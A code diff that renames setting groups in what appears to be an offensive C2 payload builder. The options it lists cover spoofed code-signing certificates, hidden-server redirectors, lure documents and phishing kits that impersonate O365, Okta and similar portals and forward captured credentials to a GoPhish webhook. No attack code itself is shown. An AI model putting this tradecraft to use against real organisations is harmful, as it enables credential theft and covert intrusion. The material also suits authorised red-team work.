-            group_name="Codesigning",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.String,
             default_value="Microsoft Corporation",
             description="Organisation Name for self-signed cert",
@@ -2912,7 +2912,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="6.4 Codesign Spoof URL",
-            group_name="Codesigning",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.String,
             default_value="www.google.com",
             description="URL to clone certificate details from",
@@ -2924,7 +2924,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="6.5 Codesign Cert",
-            group_name="Codesigning",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.File,
             description="Upload PFX/P12 certificate",
             hide_conditions=[
@@ -2934,7 +2934,7 @@ generated if none have been entered.""",
         ),
         BuildParameter(
             name="6.6 Codesign Cert Password",
-            group_name="Codesigning",
+            group_name="17 - Codesigning",
             parameter_type=BuildParameterType.String,
             default_value="",
             description="Certificate password (leave empty if none)",
@@ -2947,7 +2947,7 @@ generated if none have been entered.""",
         # ── Redirector Config Generator ───────────────────────────────────────
         BuildParameter(
             name="7.0 Generate Redirector Configs",
-            group_name="Redirector",
+            group_name="18 - Redirector",
             parameter_type=BuildParameterType.Boolean,
             description=(
                 "Generate C2 redirector configs (Apache .htaccess, Nginx block, Caddyfile, Terraform stub) "
@@ -2959,7 +2959,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="7.1 Redirector Team Server URL",
-            group_name="Redirector",
+            group_name="18 - Redirector",
             parameter_type=BuildParameterType.String,
             description="Full URL of the hidden team server (e.g. https://10.0.0.5:8443). Never exposed to the public.",
             default_value="https://10.0.0.5:8443",
@@ -2971,7 +2971,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="7.2 Redirector Public Domain",
-            group_name="Redirector",
+            group_name="18 - Redirector",
             parameter_type=BuildParameterType.String,
             description="Public hostname of the redirector (e.g. cdn.legitimate-looking.com). Used in Nginx/Caddy configs.",
             default_value="cdn.example.com",
@@ -2983,7 +2983,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="7.3 Redirector Decoy URL",
-            group_name="Redirector",
+            group_name="18 - Redirector",
             parameter_type=BuildParameterType.String,
             description="Catch-all 302 target for non-matching traffic. Pick a plausible site matching the redirector domain theme.",
             default_value="https://www.microsoft.com/en-us/",
@@ -2996,7 +2996,7 @@ generated if none have been entered.""",
         # ── Decoy Document Generator ──────────────────────────────────────────
         BuildParameter(
             name="8.0 Generate Decoy Document",
-            group_name="Decoy Document",
+            group_name="13 - Decoy",
             parameter_type=BuildParameterType.Boolean,
             description=(
                 "Generate a lure document (DOCX/XLSX) placed alongside the payload. "
@@ -3008,7 +3008,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="8.1 Decoy Template",
-            group_name="Decoy Document",
+            group_name="13 - Decoy",
             parameter_type=BuildParameterType.ChooseOne,
             description="Lure document theme: invoice, hr_policy, job_offer, it_notice, nda",
             choices=["invoice", "hr_policy", "job_offer", "it_notice", "nda"],
@@ -3021,7 +3021,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="8.2 Decoy Company Name",
-            group_name="Decoy Document",
+            group_name="13 - Decoy",
             parameter_type=BuildParameterType.String,
             description="Company name shown in the decoy document header / letterhead.",
             default_value="Acme Corporation",
@@ -3033,7 +3033,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="8.3 Decoy Recipient",
-            group_name="Decoy Document",
+            group_name="13 - Decoy",
             parameter_type=BuildParameterType.String,
             description="Addressee name used in salutations and 'Bill To' fields.",
             default_value="Valued Employee",
@@ -3045,7 +3045,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="8.4 Decoy Format",
-            group_name="Decoy Document",
+            group_name="13 - Decoy",
             parameter_type=BuildParameterType.ChooseOne,
             description="Output format for the decoy document (xlsx only available for invoice template).",
             choices=["docx", "xlsx"],
@@ -3059,7 +3059,7 @@ generated if none have been entered.""",
         # ── Phishing Page Generator ───────────────────────────────────────────
         BuildParameter(
             name="9.0 Generate Phishing Page",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.Boolean,
             description=(
                 "Generate a phishing page kit (HTML + PHP/Python capture backend) "
@@ -3071,7 +3071,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="9.1 Phishing Template",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Portal to spoof: o365, sharepoint, docusign, adfs, okta",
             choices=["o365", "sharepoint", "docusign", "adfs", "okta"],
@@ -3084,7 +3084,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="9.2 Phishing Org Name",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Organization name shown in the phishing page header.",
             default_value="Acme Corporation",
@@ -3096,7 +3096,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="9.3 Phishing Domain",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Email domain shown as placeholder in login forms (e.g. acme.com).",
             default_value="acme.com",
@@ -3108,7 +3108,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="9.4 Phishing Redirect URL",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="URL to redirect victim to after credential capture (e.g. the real O365 portal).",
             default_value="https://www.office.com",
@@ -3120,7 +3120,7 @@ generated if none have been entered.""",
 
         BuildParameter(
             name="9.5 GoPhish Webhook",
-            group_name="Triggers",
+            group_name="11 - Triggers",
             parameter_type=BuildParameterType.String,
             description="Optional GoPhish campaign webhook URL. Captured credentials are also POSTed here.",
             default_value="",
